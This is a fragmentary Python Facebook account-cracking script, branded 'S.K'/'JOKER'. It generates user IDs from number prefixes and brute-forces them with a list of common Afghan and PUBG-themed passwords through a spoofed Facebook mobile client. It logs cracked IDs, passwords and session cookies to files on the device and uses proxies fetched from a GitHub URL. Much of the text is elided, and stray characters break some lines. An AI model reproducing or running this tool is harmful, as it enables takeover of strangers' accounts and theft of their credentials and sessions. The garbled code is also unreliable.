...
try:
    ...
    os.system('python S.K.py')
	
os.system('xdg-open https://www.facebook.com/profile.php?id=MRJOKER')

try:
    prox= requests.get('https://raw.githubusercontent.com/trt-Fire/data/main/proxies.txt').text
    open('proxies.txt','w').write(proxies)
except Exception as e:
    print('\x1b[1;93mCHECS.K FOR UPDATE...')
...
\033[1;35m88888  dP"Yb  88  dP 888888 88""Yb 
\033[1;35m88 dP   Yb 88odP  88__   88__dP 
\033[1;35mo.  88 Yb   dP 88"Yb  88""   88"Yb  
\033[1;35m"bodP'  YbodP  88  Yb 888888 88  Yb
\033[1;35mدجوکراغاکمندته شه راغلاست🖕🏿🙄
\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{GREEN}[⍣]{WHITE} OWNER        :  {GREEN} S.K 
{GREEN}[⍣]{WHITE} FaceBook     :  {GREEN}S.K 
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print("\033[1;37m CRACS.K STARTED...\033[1;37m")
                                        linex()
                                        for user in fo:
...
def pak():
                user=[]
                clear()
                print('\033[1;31m CODE EXAMPLE : 01.02.03.04.05.06.07.08.09')J
                print('\033[1;31m CODE EXAMPLE : 88.80.86.87.84.83.82.89.81')O
                print('\033[1;31m CODE EXAMPLE : 71.72.73.74.75.76.77.78.79')K
                print('\033[1;31m CODE EXAMPLE : 31.32.33.34.35.36.37.38.39')E
                print('\033[1;31m CODE EXAMPLE : 99.91.92.93.94.96.95.97.98')R
                ...
                with tred(max_workers=30) as TRT:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'koko1234','راشیدخان','Rayees1234','afghan123','afghanistan','khan123','afghan','@@@@1234','707070','غنی بابا','مینه ناک','جنرال خلیفه','koko12345','۱۲۳۴۵۶','۱۲۳۴۵۶۷۸','facebook','hacker123','افغانستان','khan12','khan123','khan1234','110011','000999','شایسته کندهار','سیداغا','@@@@Afghan@@@@','baba123','خان بابا','pubg1234','lovepubg','pubg100200','afghan123','afghanistan','pubg123','password','asdasd','Afghanpubg','khanoo']
...
def ffb(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [S.K-] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                     ...
                     #   headers={'User-Agent': '[FBAN/FB4A;FBAV/39.0.0.4815;FBBV/7724320;[FBAN/FB4A;FBAV/16.0.0.20.15;FBBV/4061184;FBDM/{density=1.5,width=540,height=960};FBLC/bm_ML;FB_FW/2;FBCR/MY CELCOM;FBPN/com.facebook.katana;FBDV/Lenovo A850+;FBSV/4.2.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': '25227', 'X-FB-SIM-HNI': '29752', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', 'Content-Length': '706'}   
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [S.K-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/S.K-COOKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/S.K-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[S.K-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m [S.K-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/S.K-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/S.K-CP.txt','a').write(ids+'|'+pas+'\n')
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [S.K-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/S.K-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/S.K-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                    ...
                                    #    print('\r\r\x1b[1;31m [S.K-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/S.K-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/S.K-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/S.K-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
